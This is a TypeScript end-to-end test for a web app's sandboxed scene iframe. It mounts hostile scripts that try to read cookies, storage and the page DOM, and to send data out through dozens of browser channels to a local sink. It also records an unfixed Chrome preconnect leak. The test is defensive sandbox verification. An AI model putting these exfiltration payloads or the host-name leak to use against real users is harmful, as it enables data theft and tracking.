/**
 * The code scene frame, end to end in a real headless Chrome: the real runtime (built here as the app and the
 * worker build it), the real host (web/src/lib/studio/engine/scene-frame/host.ts) in a page served with the app's
 * own Content-Security-Policy, and four scenes.
 *
 *   1. A made-up counter scene, compiled by the app's compiler: it boots, draws frames 0, 30 and 75 and answers
 *      `painted` for each; the page's pixels inside the layer's box change as it counts.
 *   2. A hostile scene, written as the compiled module directly (as code that slipped past the compiler's checks
 *      would arrive): it tries to read the page's cookies, storage and DOM, to make every kind of request (image,
 *      fetch, XHR, script, stylesheet, font, beacon, form post, prefetch, WebSocket, EventSource, WebRTC), to run
 *      text as code, to make a fresh window to borrow its fetch, and to navigate itself, its parent and the top
 *      page. It reports what it saw through the one channel it has (an `error` message). The test passes when a
 *      sink on another port (HTTP and UDP) heard nothing, the browser made no request outside the page's own
 *      origin, the page still has its cookie, storage, DOM and address, and every read in the report failed.
 *   3. A probe (PROBE below): the ways out a policy does not always name, a nested realm booted with the frame's
 *      own scripts, and a flood of `need` messages. Every *.sink.test name is mapped to the sink, and Chrome's net
 *      log must not name any of them; the host must answer each image name once, and at most 24 names.
 *   4. A scene that never gives its thread back: how long the page then takes to answer is printed.
 *
 *   STUDIO_CHROME=<a Chrome headless shell, or a folder it is in> node --import tsx test/scene-frame-e2e.ts
 *
 * STUDIO_SCENE_OUT=<folder> keeps the counter's three screenshots. HOSTILE_ONLY / PROBE_ONLY=<regex> keep only the
 * one-line attempts of that scene whose text matches (to find which attempt a failure comes from).
 *
 * Run against a headless shell (the worker's Chrome) it passes. Run against a full Chrome (Chrome for Testing) it
 * fails, and that failure is a known finding: when a scene starts a navigation that the outer frame's frame-src
 * then refuses (its own address, a nested frame's src, a refresh, a download link), Chrome has already preconnected
 * to the target: it resolves the host name and opens a TCP connection (the sink sees a connection with no request,
 * and the net log names the host). A scene can put what it holds into such a name, and the person's address reaches
 * whoever owns it. No policy or sandbox flag stops it (found by the security review of 2026-11-12, not fixed:
 * the owner's decision).
 */
import assert from 'node:assert/strict'
import { createSocket } from 'node:dgram'
import { createServer, type IncomingMessage, type ServerResponse } from 'node:http'
import { mkdir, mkdtemp, readFile, rm, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join, resolve } from 'node:path'
import type { AddressInfo } from 'node:net'
import { createRequire } from 'node:module'
import { findChromeIn } from '../src/render.ts'

const WEB = resolve(import.meta.dirname, '../../web')
const ENGINE = join(WEB, 'src/lib/studio/engine/scene-frame')
// The app's policy on every page (web/next.config.mjs contentSecurityPolicy, production form).
const APP_POLICY = "script-src 'self' 'unsafe-inline' 'wasm-unsafe-eval' blob:; worker-src 'self' blob:; object-src 'none'; base-uri 'self'"

const COUNTER = `import { useTime, Counter, spring, mix } from '@studio/kit';
import { AbsoluteFill } from 'remotion';
export default function Stat({ value = 1204, label = 'meetings remembered' }: { value?: number; label?: string }) {
  const { t, height } = useTime();
  const grow = spring(t, 0.3, { duration: 1.2, bounce: 0.1 });
  return <AbsoluteFill style={{ background: '#0e0f13' }}>
    <div style={{ position: 'absolute', left: 190, top: height / 2 - 260, color: '#f4f2ee', font: '800 240px sans-serif', letterSpacing: '-0.05em' }}><Counter value={value} at={0.2} duration={1.6} /></div>
    <div style={{ position: 'absolute', left: 190, top: height / 2 + 40, color: '#9a9aa2', font: '500 48px sans-serif' }}>{label}</div>
    <div style={{ position: 'absolute', left: 190, top: height / 2 + 140, height: 36, width: mix(0, 1540, grow), background: '#ff5a36', borderRadius: 18 }} />
  </AbsoluteFill>;
}`

/** The hostile scene: CommonJS, as the frame runs it, with every attempt it can make. SINK is replaced. */
const HOSTILE = String.raw`
var report = {};
function attempt(name, fn) { try { var v = fn(); report[name] = 'ok: ' + String(v).slice(0, 80); } catch (e) { report[name] = 'threw: ' + String(e && e.name || e); } }
attempt('own cookie', function () { return document.cookie; });
attempt('parent cookie', function () { return window.parent.document.cookie; });
attempt('top cookie', function () { return window.top.document.cookie; });
attempt('top DOM', function () { return window.top.document.getElementById('secret').textContent; });
attempt('top storage', function () { return window.top.localStorage.getItem('secret'); });
attempt('localStorage', function () { return localStorage.getItem('secret'); });
attempt('sessionStorage', function () { return sessionStorage.length; });
attempt('indexedDB', function () { return indexedDB.open('x'); });
attempt('eval', function () { return eval('1 + 1'); });
attempt('Function', function () { return new Function('return 2')(); });
attempt('setTimeout string', function () { return setTimeout('window.__x = 1', 0); });
attempt('fetch', function () { return window.fetch('SINK/fetch'); });
attempt('XMLHttpRequest', function () { var x = new XMLHttpRequest(); x.open('GET', 'SINK/xhr'); x.send(); return 'sent'; });
attempt('WebSocket', function () { return new WebSocket('ws://SINKHOST/ws'); });
attempt('EventSource', function () { return new EventSource('SINK/sse'); });
attempt('sendBeacon', function () { return navigator.sendBeacon('SINK/beacon', 'x'); });
attempt('RTCPeerConnection', function () { var pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:SINKUDP' }] }); pc.createDataChannel('x'); pc.createOffer().then(function (o) { return pc.setLocalDescription(o); }); return 'made'; });
attempt('image', function () { var i = new Image(); i.src = 'SINK/image'; document.body.appendChild(i); return 'added'; });
attempt('script', function () { var s = document.createElement('script'); s.src = 'SINK/script'; document.head.appendChild(s); return 'added'; });
attempt('inline script', function () { var s = document.createElement('script'); s.textContent = 'window.__inline = 1'; document.head.appendChild(s); return 'added'; });
attempt('stylesheet', function () { var l = document.createElement('link'); l.rel = 'stylesheet'; l.href = 'SINK/style'; document.head.appendChild(l); return 'added'; });
attempt('prefetch', function () { var l = document.createElement('link'); l.rel = 'prefetch'; l.href = 'SINK/prefetch'; document.head.appendChild(l); return 'added'; });
attempt('css url', function () { var d = document.createElement('div'); d.style.backgroundImage = 'url(SINK/css)'; d.style.width = '10px'; d.style.height = '10px'; document.body.appendChild(d); return 'added'; });
attempt('font', function () { var f = new FontFace('X', 'url(SINK/font)'); document.fonts.add(f); f.load().catch(function () {}); return 'added'; });
attempt('video', function () { var v = document.createElement('video'); v.src = 'SINK/video'; document.body.appendChild(v); return 'added'; });
attempt('form post', function () { var f = document.createElement('form'); f.method = 'POST'; f.action = 'SINK/form'; document.body.appendChild(f); f.submit(); return 'submitted'; });
attempt('window.open', function () { return window.open('SINK/popup'); });
attempt('fresh window fetch', function () { var f = document.createElement('iframe'); document.body.appendChild(f); var w = f.contentWindow; w.fetch('SINK/realm').catch(function () {}); return 'called'; });
attempt('fresh window RTC', function () { var f = document.createElement('iframe'); document.body.appendChild(f); var P = f.contentWindow.RTCPeerConnection; var pc = new P({ iceServers: [{ urls: 'stun:SINKUDP' }] }); pc.createDataChannel('y'); pc.createOffer().then(function (o) { return pc.setLocalDescription(o); }); return 'made'; });
attempt('nested frame', function () { var f = document.createElement('iframe'); f.src = 'SINK/frame'; document.body.appendChild(f); return 'added'; });
attempt('top navigation', function () { window.top.location.href = 'SINK/top'; return 'set'; });
attempt('parent navigation', function () { window.parent.location.href = 'SINK/parent'; return 'set'; });
attempt('postMessage to page', function () { window.top.postMessage({ ns: 'studio-scene', type: 'painted', n: 999999 }, '*'); return 'posted'; });
setTimeout(function () {
  attempt('meta refresh', function () { var m = document.createElement('meta'); m.httpEquiv = 'refresh'; m.content = '0;url=SINK/refresh'; document.head.appendChild(m); return 'added'; });
  attempt('inline ran', function () { return window.__inline; });
  attempt('string timer ran', function () { return window.__x; });
  window.parent.postMessage({ ns: 'studio-scene', type: 'error', text: 'REPORT ' + JSON.stringify(report) }, '*');
  setTimeout(function () { try { location.href = 'SINK/self'; } catch (e) {} }, 300);
}, 1200);
exports.default = function Hostile() { return null; };
`

/**
 * The second hostile scene, from an independent review: the ways out a policy does not always name. DNS prefetch and
 * preconnect (a lookup or a connection is a leak even with no request), clicks on links (ping, a new window, a
 * download), SVG and CSS references, every element that can name an address, the newer request APIs (fetchLater,
 * WebSocketStream), worklets and service workers, the page's history, a nested frame booted with the frame's own
 * allowed scripts (to get a realm where the doors are still open), and a flood of `need` messages straight to the
 * relay. Each host is `leak-<what>.sink.test`, mapped to the sink, and the browser's net log is searched for them
 * too. LEAKPORT is replaced.
 */
const PROBE = String.raw`
var report = {};
function attempt(name, fn) { try { var v = fn(); report[name] = 'ok: ' + String(v).slice(0, 80); } catch (e) { report[name] = 'threw: ' + String(e && e.name || e); } }
function leak(what) { return 'http://leak-' + what + '.sink.test:LEAKPORT/' + what; }
if (window.name === 'nested') {
  // A nested frame the scene booted with the frame's own scripts: its doors should be shut the same way.
  attempt('nested RTCPeerConnection', function () { return typeof RTCPeerConnection; });
  attempt('nested RTC made', function () { var pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:leak-nestedstun.sink.test:LEAKPORT' }] }); pc.createDataChannel('x'); pc.createOffer().then(function (o) { return pc.setLocalDescription(o); }); return 'made'; });
  attempt('nested fetch', function () { return fetch(leak('nestedfetch')); });
  parent.postMessage({ nestedReport: report }, '*');
  exports.default = function Nested() { return null; };
} else {
  var el = function (tag, attrs, parentNode) { var e = document.createElement(tag); for (var k in attrs) e.setAttribute(k, attrs[k]); (parentNode || document.body).appendChild(e); return e; };
  var svgEl = function (tag, attrs, parentNode) { var e = document.createElementNS('http://www.w3.org/2000/svg', tag); for (var k in attrs) e.setAttribute(k, attrs[k]); parentNode.appendChild(e); return e; };
  attempt('dns-prefetch', function () { el('link', { rel: 'dns-prefetch', href: leak('dnsprefetch') }, document.head); return 'added'; });
  attempt('preconnect', function () { el('link', { rel: 'preconnect', href: leak('preconnect') }, document.head); return 'added'; });
  attempt('preload image', function () { el('link', { rel: 'preload', as: 'image', href: leak('preload') }, document.head); return 'added'; });
  attempt('modulepreload', function () { el('link', { rel: 'modulepreload', href: leak('modulepreload') }, document.head); return 'added'; });
  attempt('icon', function () { el('link', { rel: 'icon', href: leak('icon') }, document.head); return 'added'; });
  attempt('anchor href', function () { el('a', { href: leak('anchor') }).textContent = 'x'; return 'added'; });
  attempt('anchor new window click', function () { var a = el('a', { href: leak('blank'), target: '_blank' }); a.click(); return 'clicked'; });
  attempt('anchor top click', function () { var a = el('a', { href: leak('topclick'), target: '_top' }); a.click(); return 'clicked'; });
  attempt('form new window', function () { var f = el('form', { method: 'GET', action: leak('formblank'), target: '_blank' }); f.submit(); return 'submitted'; });
  attempt('svg use', function () { var s = svgEl('svg', {}, document.body); svgEl('use', { href: leak('svguse') + '#a' }, s); return 'added'; });
  attempt('svg image', function () { var s = svgEl('svg', {}, document.body); svgEl('image', { href: leak('svgimage'), width: '10', height: '10' }, s); return 'added'; });
  attempt('svg feImage', function () { var s = svgEl('svg', {}, document.body); var f = svgEl('filter', { id: 'fi' }, s); svgEl('feImage', { href: leak('feimage') }, f); svgEl('rect', { width: '10', height: '10', filter: 'url(#fi)' }, s); return 'added'; });
  attempt('style @import', function () { el('style', {}, document.head).textContent = '@import url("' + leak('import') + '");'; return 'added'; });
  attempt('style image-set', function () { el('style', {}, document.head).textContent = 'body{background-image:image-set(url("' + leak('imageset') + '") 1x)}'; return 'added'; });
  attempt('style font-face', function () { el('style', {}, document.head).textContent = '@font-face{font-family:Q;src:url("' + leak('fontface') + '")} body{font-family:Q}'; return 'added'; });
  attempt('cursor url', function () { el('div', { style: 'width:10px;height:10px;cursor:url(' + leak('cursor') + '),auto' }); return 'added'; });
  attempt('object', function () { el('object', { data: leak('object') }); return 'added'; });
  attempt('embed', function () { el('embed', { src: leak('embed') }); return 'added'; });
  attempt('video poster', function () { el('video', { poster: leak('poster') }); return 'added'; });
  attempt('audio', function () { el('audio', { src: leak('audio'), preload: 'auto' }); return 'added'; });
  attempt('track', function () { var v = el('video', {}); el('track', { src: leak('track'), default: '' }, v); return 'added'; });
  attempt('input image', function () { el('input', { type: 'image', src: leak('inputimage') }); return 'added'; });
  attempt('img srcset', function () { el('img', { srcset: leak('srcset') + ' 1x' }); return 'added'; });
  attempt('picture source', function () { var p = el('picture', {}); el('source', { srcset: leak('source') }, p); el('img', {}, p); return 'added'; });
  attempt('fetchLater', function () { return typeof fetchLater === 'function' ? (fetchLater(leak('fetchlater')), 'called') : 'absent'; });
  attempt('WebSocketStream', function () { return typeof WebSocketStream === 'function' ? (new WebSocketStream('ws://leak-wss.sink.test:LEAKPORT/'), 'made') : 'absent'; });
  attempt('serviceWorker', function () { return navigator.serviceWorker ? navigator.serviceWorker.register('/sw.js') : 'absent'; });
  attempt('paintWorklet', function () { return CSS.paintWorklet ? CSS.paintWorklet.addModule(leak('paint')) : 'absent'; });
  attempt('audioWorklet', function () { var c = new AudioContext(); return c.audioWorklet.addModule(leak('audioworklet')); });
  attempt('getUserMedia', function () { return navigator.mediaDevices ? navigator.mediaDevices.getUserMedia({ video: true }) : 'absent'; });
  attempt('history back', function () { history.back(); return 'called'; });
  attempt('ancestor origins', function () { return location.ancestorOrigins && location.ancestorOrigins.length; });
  attempt('meta CSP loosened', function () { el('meta', { 'http-equiv': 'Content-Security-Policy', content: "img-src *; connect-src *" }, document.head); var i = new Image(); i.src = leak('loosened'); document.body.appendChild(i); return 'added'; });
  // A flood of requests for images, straight to the relay: the host should answer each name once, and few names.
  attempt('need flood', function () { for (var i = 0; i < 400; i++) parent.postMessage({ ns: 'studio-scene', type: 'need', name: 'same' }, '*'); for (var j = 0; j < 400; j++) parent.postMessage({ ns: 'studio-scene', type: 'need', name: 'name-' + j }, '*'); return 'posted'; });
  // A nested frame booted with the frame's own (allowed) bootstrap, runtime and scene scripts.
  attempt('nested frame', function () {
    // The bootstrap is the body's script; it added the runtime and then the scene to the head.
    var head = [].slice.call(document.head.querySelectorAll('script')).map(function (s) { return s.textContent; });
    var bootstrap = document.body.querySelector('script').textContent, runtime = head[0], scene = head[1];
    addEventListener('message', function (e) {
      var d = e.data;
      if (d && d.ns === 'studio-scene' && d.type === 'ready' && e.source === f.contentWindow) f.contentWindow.postMessage({ ns: 'studio-scene', type: 'boot', runtime: runtime, scene: scene }, '*');
      if (d && d.nestedReport) for (var k in d.nestedReport) report[k] = d.nestedReport[k];
    });
    var f = document.createElement('iframe'); f.name = 'nested'; f.srcdoc = '<!doctype html><body><script>' + bootstrap + '</scr' + 'ipt></body>'; document.body.appendChild(f);
    return head.length;
  });
  setTimeout(function () {
    window.parent.postMessage({ ns: 'studio-scene', type: 'error', text: 'PROBE ' + JSON.stringify(report) }, '*');
    // Last, as each navigates a frame (which the outer frame's frame-src refuses) and may end this one: a nested
    // frame with an address, a refresh, the frame itself (the address carries what a scene would send), a ping and
    // a download (both navigate to the page's own address first).
    el('iframe', { src: leak('nestedsrc') });
    el('meta', { 'http-equiv': 'refresh', content: '0;url=' + leak('refresh') }, document.head);
    var ping = el('a', { href: '#p', ping: leak('ping') }); ping.click();
    var download = el('a', { href: leak('download'), download: 'x.txt' }); download.click();
    setTimeout(function () { location.href = leak('selfnav'); }, 300);
  }, 2000);
  exports.default = function Probe() { return null; };
}
`

/** A scene that never gives its thread back: the page that shows it must stay usable. */
const SPIN = String.raw`exports.default = function Spin() { var x = 0; for (;;) x++; };`

type Hit = { path: string; from: string }

async function main() {
  const chromeSetting = process.env.STUDIO_CHROME
  if (!chromeSetting) throw new Error('Set STUDIO_CHROME to a Chrome headless shell (or a folder it is in)')
  const chrome = (await findChromeIn(chromeSetting)) ?? chromeSetting
  const work = await mkdtemp(join(tmpdir(), 'scene-frame-e2e-'))
  const esbuild = await import('esbuild')
  // web/ is not an ES module package: its files come through require (as src/engine.ts does).
  const require = createRequire(import.meta.url)
  const { buildSceneRuntime } = require('../../web/src/lib/studio/engine/scene-frame/build.ts') as typeof import('../../web/src/lib/studio/engine/scene-frame/build.ts')
  const { compileSceneSource } = require('../../web/src/lib/studio/server/scene-compile.ts') as typeof import('../../web/src/lib/studio/server/scene-compile.ts')

  // The runtime, and the host as a page script.
  const runtimePath = join(work, 'frame-runtime.js')
  await buildSceneRuntime(esbuild, join(WEB, 'src/lib/studio/engine'), runtimePath)
  const hostBundle = await esbuild.build({
    stdin: {
      contents: `import { SceneHost } from './host'; window.mountScene = (code, name) => { const f = document.createElement('iframe'); f.setAttribute('sandbox', 'allow-scripts'); f.style.cssText = 'position:absolute;left:0;top:0;width:960px;height:540px;border:0;background:transparent;color-scheme:normal'; document.getElementById('box').appendChild(f);
        const host = new SceneHost(f, { name, runtimeUrl: '/runtime.js', codeUrl: '/scene/' + code, onError: (t) => { (window.errors ||= []).push(t) }, image: async (n) => { (window.imageCalls ||= []).push(n); return { name: n, kind: 'missing' } } }); window.host = host; return true; }`,
      resolveDir: ENGINE, loader: 'ts',
    },
    bundle: true, write: false, format: 'iife', platform: 'browser', target: 'es2020',
  })
  const hostJs = hostBundle.outputFiles[0]!.text
  const counter = compileSceneSource(COUNTER, 'counter')
  if ('error' in counter) throw new Error(`counter did not compile: ${counter.error}`)

  // The sink: anything that reaches it is a leak.
  const hits: Hit[] = []
  const sink = createServer((req: IncomingMessage, res: ServerResponse) => { hits.push({ path: req.url ?? '', from: 'http' }); res.end('leak') })
  sink.on('upgrade', (req, socket) => { hits.push({ path: req.url ?? '', from: 'websocket' }); socket.destroy() })
  // A connection with no request (a preconnect) is a leak as well.
  sink.on('connection', () => hits.push({ path: '', from: 'tcp connection' }))
  await new Promise<void>((r) => sink.listen(0, '127.0.0.1', r))
  const sinkPort = (sink.address() as AddressInfo).port
  const udp = createSocket('udp4')
  udp.on('message', () => hits.push({ path: 'stun', from: 'udp' }))
  await new Promise<void>((r) => udp.bind(0, '127.0.0.1', r))
  const udpPort = udp.address().port
  const SINK = `http://127.0.0.1:${sinkPort}`
  const hostileOnly = process.env.HOSTILE_ONLY ? new RegExp(process.env.HOSTILE_ONLY) : null
  const hostile = HOSTILE.split('\n').filter((l) => !hostileOnly || !/^\s*(attempt\('.*\}\);|setTimeout\(function \(\) \{ try)/.test(l) || hostileOnly.test(l)).join('\n').replaceAll('SINKHOST', `127.0.0.1:${sinkPort}`).replaceAll('SINKUDP', `127.0.0.1:${udpPort}`).replaceAll('SINK', SINK)
  const only = process.env.PROBE_ONLY ? new RegExp(process.env.PROBE_ONLY) : null
  const probe = PROBE.replaceAll('LEAKPORT', String(sinkPort)).split('\n').filter((l) => !only || !/^  attempt\('.*\}\);$/.test(l) || only.test(l)).join('\n')

  // The page: the app's policy, a cookie, storage and a secret in its DOM.
  const runtime = await readFile(runtimePath, 'utf8')
  const page = `<!doctype html><html><head><meta charset="utf-8"></head><body style="margin:0;background:#20242c"><div id="secret">page secret 4242</div><div id="box" style="position:relative;width:960px;height:540px"></div><script src="/host.js"></script></body></html>`
  const app = createServer((req, res) => {
    const url = req.url ?? '/'
    const send = (type: string, body: string, extra: Record<string, string> = {}) => { res.writeHead(200, { 'content-type': type, 'content-security-policy': APP_POLICY, 'x-frame-options': 'DENY', ...extra }); res.end(body) }
    if (url === '/') return send('text/html', page, { 'set-cookie': 'session=page-cookie-123; Path=/' })
    if (url === '/host.js') return send('text/javascript', hostJs)
    if (url === '/runtime.js') return send('text/javascript', runtime)
    if (url === '/scene/counter') return send('application/octet-stream', counter.code)
    if (url === '/scene/hostile') return send('application/octet-stream', hostile)
    if (url === '/scene/probe') return send('application/octet-stream', probe)
    if (url === '/scene/spin') return send('application/octet-stream', SPIN)
    res.writeHead(404); res.end()
  })
  await new Promise<void>((r) => app.listen(0, '127.0.0.1', r))
  const origin = `http://127.0.0.1:${(app.address() as AddressInfo).port}`

  const { chromium } = await import('playwright-core')
  // Every *.sink.test name goes to the sink, and the net log shows any lookup of one (a DNS leak needs no request).
  const netLog = join(work, 'net-log.json')
  const browser = await chromium.launch({ executablePath: chrome, headless: true, args: [`--host-resolver-rules=MAP *.sink.test 127.0.0.1`, `--log-net-log=${netLog}`] })
  const outside: string[] = []
  const blocked: string[] = []
  try {
    const context = await browser.newContext({ viewport: { width: 960, height: 600 } })
    // A request the frame's policy blocks is still announced by the browser, then fails as blocked by the policy (or,
    // for an SVG <use> of another origin, as refused for its origin before it is sent): only one that got an answer,
    // or failed any other way, counts as one that left. The sink and the net log are the proof either way.
    const isOutside = (url: string) => !url.startsWith(origin) && !/^(data|blob|about):/.test(url)
    context.on('response', (response) => { if (isOutside(response.url())) outside.push(`${response.url()} answered`) })
    context.on('requestfailed', (request) => { const why = request.failure()?.errorText ?? ''; if (isOutside(request.url())) (/csp|BLOCKED|^origin$/i.test(why) ? blocked : outside).push(`${request.url()} ${why}`) })
    const tab = await context.newPage()
    const consoleLines: string[] = []
    const navigations: string[] = []
    tab.on('framenavigated', (f) => navigations.push(f.url()))
    tab.on('console', (m) => consoleLines.push(m.text()))
    tab.on('crash', () => console.log('The page crashed'))
    await tab.goto(origin)
    await tab.evaluate(() => { localStorage.setItem('secret', 'page-storage-77') })

    // 1. The counter.
    await tab.evaluate(() => (window as unknown as { mountScene: (c: string, n: string) => void }).mountScene('counter', 'Counter'))
    const shots: Buffer[] = []
    for (const frame of [0, 30, 75]) {
      const started = Date.now()
      await tab.evaluate((f) => (window as unknown as { host: { show(r: unknown): Promise<void> } }).host.show({ frame: f, fps: 30, durationInFrames: 120, stageWidth: 1920, stageHeight: 1080, viewWidth: 960, viewHeight: 540, props: { value: 1204, label: 'meetings remembered' } }), frame)
      console.log(`counter frame ${frame} painted in ${Date.now() - started} ms`)
      shots.push(await tab.screenshot({ clip: { x: 0, y: 18, width: 960, height: 540 } }))
    }
    const errors = await tab.evaluate(() => (window as unknown as { errors?: string[] }).errors ?? [])
    assert.deepEqual(errors, [], `the counter reported errors: ${errors.join(' | ')}`)
    assert.notDeepEqual(shots[0], shots[1], 'frame 30 looks like frame 0')
    assert.notDeepEqual(shots[1], shots[2], 'frame 75 looks like frame 30')
    const out = process.env.STUDIO_SCENE_OUT
    if (out) {
      await mkdir(out, { recursive: true })
      for (const [i, frame] of [0, 30, 75].entries()) await writeFile(join(out, `frame-counter-${frame}.png`), shots[i]!)
      console.log(`screenshots in ${out}`)
    }

    // 2. The hostile scene, in a second frame on the same page.
    await tab.evaluate(() => { (window as unknown as { errors: string[] }).errors = []; document.getElementById('box')!.innerHTML = '' })
    await tab.evaluate(() => (window as unknown as { mountScene: (c: string, n: string) => void }).mountScene('hostile', 'Hostile'))
    void tab.evaluate(() => (window as unknown as { host: { show(r: unknown): Promise<void> } }).host.show({ frame: 0, fps: 30, durationInFrames: 30, stageWidth: 1920, stageHeight: 1080, viewWidth: 960, viewHeight: 540, props: {} }).catch(() => undefined))
    let report: Record<string, string> | null = null
    for (let i = 0; i < 60 && !report; i++) {
      await new Promise((r) => setTimeout(r, 100))
      const errs = await tab.evaluate(() => (window as unknown as { errors?: string[] }).errors ?? [])
      const line = errs.find((e) => e.startsWith('REPORT '))
      if (line) report = JSON.parse(line.slice('REPORT '.length)) as Record<string, string>
    }
    // Let anything that would leak late (the self navigation, a STUN packet) arrive.
    await new Promise((r) => setTimeout(r, 2500))
    assert.ok(report, `the hostile scene sent no report (errors: ${JSON.stringify(await tab.evaluate(() => (window as unknown as { errors?: string[] }).errors))})`)
    console.log('\nWhat the hostile scene saw:')
    for (const [k, v] of Object.entries(report)) console.log(`  ${k.padEnd(22)} ${v}`)

    const state = await tab.evaluate(() => ({ url: location.href, cookie: document.cookie, storage: localStorage.getItem('secret'), secret: document.getElementById('secret')?.textContent }))
    console.log('\nThe page after:', JSON.stringify(state))
    console.log('Sink hits:', JSON.stringify(hits))
    console.log('Frame navigations:', JSON.stringify(navigations))
    console.log('Requests outside the page that left:', JSON.stringify(outside))
    console.log('Requests the policy blocked before they left:', JSON.stringify(blocked))
    assert.equal(state.url, `${origin}/`, 'the page was navigated')
    assert.equal(state.cookie, 'session=page-cookie-123', 'the page lost its cookie')
    assert.equal(state.storage, 'page-storage-77')
    assert.equal(state.secret, 'page secret 4242')
    assert.deepEqual(hits, [], 'something reached the sink')
    assert.deepEqual(navigations.filter((u) => u.startsWith(SINK)), [], 'a frame navigated to the sink')
    assert.deepEqual(outside, [], 'the browser made requests outside the page')
    if (!hostileOnly) for (const read of ['own cookie', 'parent cookie', 'top cookie', 'top DOM', 'top storage', 'localStorage', 'sessionStorage', 'indexedDB', 'eval', 'Function', 'fetch', 'XMLHttpRequest', 'WebSocket', 'EventSource', 'sendBeacon', 'RTCPeerConnection', 'window.open', 'top navigation', 'parent navigation'])
      assert.match(report[read] ?? 'missing', /^threw|^ok: (undefined|null|false)$/, `${read}: ${report[read]}`)
    if (!hostileOnly) assert.match(report['inline ran'] ?? '', /^ok: undefined$/, 'an inline script the scene added ran')
    if (!hostileOnly) assert.match(report['string timer ran'] ?? '', /^ok: undefined$/, 'a string timer ran')

    // 3. The probe: the ways out a policy does not always name, a nested realm, and a flood of `need` messages.
    await tab.evaluate(() => { history.pushState({}, '', '/after'); (window as unknown as { errors: string[]; imageCalls: string[] }).errors = []; (window as unknown as { imageCalls: string[] }).imageCalls = []; document.getElementById('box')!.innerHTML = '' })
    await tab.evaluate(() => (window as unknown as { mountScene: (c: string, n: string) => void }).mountScene('probe', 'Probe'))
    void tab.evaluate(() => (window as unknown as { host: { show(r: unknown): Promise<void> } }).host.show({ frame: 0, fps: 30, durationInFrames: 30, stageWidth: 1920, stageHeight: 1080, viewWidth: 960, viewHeight: 540, props: {} }).catch(() => undefined)).catch(() => undefined)
    let probed: Record<string, string> | null = null
    for (let i = 0; i < 80 && !probed; i++) {
      await new Promise((r) => setTimeout(r, 100))
      const errs = await tab.evaluate(() => (window as unknown as { errors?: string[] }).errors ?? [])
      const line = errs.find((e) => e.startsWith('PROBE '))
      if (line) probed = JSON.parse(line.slice('PROBE '.length)) as Record<string, string>
    }
    await new Promise((r) => setTimeout(r, 2500))
    assert.ok(probed, 'the probe sent no report')
    console.log('\nWhat the probe saw:')
    for (const [k, v] of Object.entries(probed)) console.log(`  ${k.padEnd(26)} ${v}`)
    const after = await tab.evaluate(() => ({ url: location.href, imageCalls: (window as unknown as { imageCalls: string[] }).imageCalls }))
    console.log(`The page after the probe: ${after.url}; the host was asked for ${after.imageCalls.length} images (${new Set(after.imageCalls).size} names)`)
    console.log('Sink hits:', JSON.stringify(hits))
    console.log('Requests outside the page that left:', JSON.stringify(outside))
    assert.equal(after.url, `${origin}/after`, 'the scene moved the page through its history')
    // Chrome keeps a sandboxed frame out of the page's history anyway; WebKit does not (an offscreen WKWebView moved the
    // page back from a frame's history.back()), so the runtime takes history's moves away, and it must stay so.
    assert.match(probed['history back'] ?? 'missing', /^threw/, `history back: ${probed['history back']}`)
    assert.deepEqual(hits, [], 'something reached the sink')
    assert.deepEqual(outside, [], 'the browser made requests outside the page')
    // The nested realm ran the frame's scripts, and its doors were shut too.
    assert.match(probed['nested RTCPeerConnection'] ?? 'missing', /^ok: undefined$/, `nested realm: ${probed['nested RTCPeerConnection']}`)
    assert.match(probed['nested RTC made'] ?? 'missing', /^threw/)
    // The host answers each name once, and at most MAX_ASSETS names.
    assert.ok(after.imageCalls.length <= 24 && new Set(after.imageCalls).size === after.imageCalls.length, `the host fetched ${after.imageCalls.length} images for a flood of need messages`)

    // 4. A scene that never gives its thread back: the page that shows it must stay usable.
    await tab.evaluate(() => { document.getElementById('box')!.innerHTML = '' })
    // Measured, not asserted: a headless shell (the worker's Chrome) runs a sandboxed srcdoc frame on the page's own
    // thread, so the page stops answering; a full Chrome isolates the frame and the page answers at once.
    console.log('\nA scene that never paints:', await spinCheck(tab))
  } finally {
    await browser.close()
    sink.close(); udp.close(); app.close()
  }
  // The net log: no lookup of, or connection to, any name the scenes made up.
  const logged = await readFile(netLog, 'utf8').catch(() => '')
  const leaked = [...new Set(logged.match(/leak-[a-z]+\.sink\.test/g) ?? [])]
  console.log(`Net log: ${logged.length} bytes; names the scenes made up found in it: ${JSON.stringify(leaked)}`)
  if (!process.env.STUDIO_SCENE_KEEP) await rm(work, { recursive: true, force: true })
  assert.deepEqual(leaked, [], 'the browser looked up or connected to a name a scene made up')
  console.log('\nscene frame e2e: all checks passed')
}

/** Mount the spinning scene, ask for a frame, and time how long the page takes to answer. */
async function spinCheck(tab: import('playwright-core').Page): Promise<string> {
  await tab.evaluate(() => (window as unknown as { mountScene: (c: string, n: string) => void }).mountScene('spin', 'Spin'))
  void tab.evaluate(() => (window as unknown as { host: { show(r: unknown): Promise<void> } }).host.show({ frame: 0, fps: 30, durationInFrames: 30, stageWidth: 1920, stageHeight: 1080, viewWidth: 960, viewHeight: 540, props: {} }).catch(() => undefined)).catch(() => undefined)
  await new Promise((r) => setTimeout(r, 1500))
  const started = Date.now()
  const answered = await Promise.race([tab.evaluate(() => 1 + 1).then(() => true), new Promise<boolean>((r) => setTimeout(() => r(false), 5000))])
  return answered ? `the page answered in ${Date.now() - started} ms` : 'the page did not answer within 5 s (its thread is the scene\'s)'
}

await main()
